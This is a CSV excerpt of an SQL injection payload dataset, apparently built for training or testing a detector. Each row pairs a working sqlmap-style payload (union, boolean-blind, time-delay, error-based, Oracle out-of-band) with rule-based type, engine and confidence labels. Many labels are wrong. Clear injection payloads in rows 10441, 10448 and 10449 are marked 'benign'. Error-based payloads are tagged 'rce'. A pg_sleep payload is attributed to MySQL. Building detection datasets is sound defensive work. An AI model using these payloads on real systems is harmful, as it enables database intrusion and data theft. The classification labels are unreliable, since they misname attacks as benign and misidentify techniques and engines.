row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
10440,"1%"" ) )",1,,unknown,unknown,0.5,Insufficient information to classify,rule-based
10441,1'+ ( select 'yyyn' where 5395 = 5395,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
10442,1' ) and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( 'sgdj' like 'sgdj,1,,out_of_band,oracle,0.95,utl_inaddr detected — out_of_band injection (priority 2) on oracle,rule-based
10443,"1%"" and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ""%"" = """,1,,error_based,oracle,0.95,xmltype ( detected — error_based injection (priority 4) on oracle,rule-based
10444,"-3359 union all select 4675,4675,4675--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
10445,"1"" ) where 9545 = 9545 and 9198 = 9198--",1,,boolean_blind,generic,0.95,9545 = 9545 and detected — boolean_blind injection (priority 8) on generic,rule-based
10446,"1' ) ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( 'luoj' = 'luoj",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
10447,"-9263' ) as qodg where 6798 = 6798 or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --",1,,error_based,oracle,0.95,ctxsys detected — error_based injection (priority 4) on oracle,rule-based
10448,-1011 or 7140 = 9977--,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
10449,select ( case when ( 3539 = 8768 ) then 3539 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
10450,"1' ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( 'hfxu' like 'hfxu",1,,heavy_query,generic,0.95,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users detected — heavy_query injection (priority 6) on generic",rule-based
10451,1 and 6969 = ( select 6969 from pg_sleep ( 5 ) ) # pkcp,1,,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
10452,1' ) ) ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ( ( ( 'yctp' = 'yctp,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
10453,"1"" ) where 2388 = 2388 union all select null,null,null,null,null,null,null,null,null--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
10454,"1"" ) union all select null,null,null--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
10455,"1"" ) ) ) and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( ( ""tepf"" = ""tepf",1,,rce,mysql,0.95,0x7171706a71 detected — rce injection (priority 1) on mysql,rule-based
10456,"1' union all select null,null--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
10457,"1' and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a )",1,,rce,mysql,0.95,0x7171706a71 detected — rce injection (priority 1) on mysql,rule-based
10458,"-8436' ) as frmf where 7225 = 7225 or make_set ( 9354 = 9354,7185 ) --",1,,boolean_blind,generic,0.95,7225 = 7225 or detected — boolean_blind injection (priority 8) on generic,rule-based
10459,( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( ( ( 'pfle' like 'pfle,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
10460,"1"" ) as uyns where 4751 = 4751 and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) --",1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
10461,"1' ) and elt ( 4249 = 4249,7259 ) and ( 'ifca' like 'ifca",1,,boolean_blind,generic,0.95,") and (, like ' detected — boolean_blind injection (priority 8) on generic",rule-based
10462,"-2625"" ) ) as qfuo where 1980 = 1980 union all select 1980,1980,1980--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
10463,"1"" ) ) ) waitfor delay '0:0:5' and ( ( ( ""tuhy"" like ""tuhy",1,,time_blind,mssql,0.95,waitfor delay is MSSQL-specific time-delay function — time-based blind inference (priority 5),rule-based
